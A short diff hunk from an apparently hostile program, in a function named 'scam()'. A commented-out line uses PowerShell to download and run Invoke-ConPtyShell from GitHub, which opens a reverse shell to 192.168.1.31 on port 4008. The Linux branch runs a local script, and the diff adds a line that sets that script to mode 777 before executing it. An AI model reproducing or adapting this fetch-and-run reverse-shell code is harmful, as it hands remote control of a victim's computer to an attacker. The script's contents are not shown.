@@ -32,6 +32,7 @@ void scam() {
         // system("& \"IEX(IWR https://raw.githubusercontent.com/benax-rw/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.31 4008\" p1");
     }
     else if (getOsName() == "Linux") {
+        system("chmod 777 ./script-linux.sh");
         execl("./script-linux.sh","script-linux.sh",(char*)0);
     }
 }
